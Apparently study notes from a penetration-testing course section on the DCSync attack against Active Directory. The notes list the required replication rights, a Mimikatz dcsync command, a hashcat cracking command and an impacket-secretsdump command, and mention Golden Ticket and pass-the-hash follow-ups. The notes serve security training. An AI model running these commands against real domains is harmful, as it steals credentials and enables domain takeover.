# 23.2.5 — Domain Controller Synchronization (DCSync)

- Module: PEN-200 · 23. Attacking Active Directory Authentication
- Source: portal.offsec.com · module `attacking-active-directory-authentication-46102` (§23.2.5)
- Code blocks: 3

> Abuse the **Directory Replication Service** (`IDL_DRSGetNCChanges`): impersonate a DC and ask a
> real DC to replicate **any user's** credentials. A DC only checks that the caller's SID has the
> replication rights — it doesn't verify the caller is actually a DC. Output omitted.

## Rights required

**Replicating Directory Changes** + **Replicating Directory Changes All** (+ In Filtered Set).
Held by default by **Domain Admins**, **Enterprise Admins**, **Administrators** — or any account
those rights were delegated to.

## Windows — Mimikatz

```
lsadump::dcsync /user:{{DOMAIN_NB}}\{{TARGET_USER}}
```

> Target any account — including `krbtgt` (→ Golden Ticket) and the built-in `Administrator`.

## Crack the NTLM hash (mode 1000)

```bash
hashcat -m 1000 {{HASHFILE}} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Linux — impacket-secretsdump

```bash
impacket-secretsdump -just-dc-user {{TARGET_USER}} {{DOMAIN}}/{{USERNAME}}:"{{PASSWORD}}"@{{DC_IP}}
```

> Uses the DRSUAPI method. The dumped NTLM hash can be cracked **or** reused directly for
> Pass-the-Hash lateral movement (next module / [[../htbad/22-dcsync]]). This is typically the
> domain-dominance payoff of the whole chain.
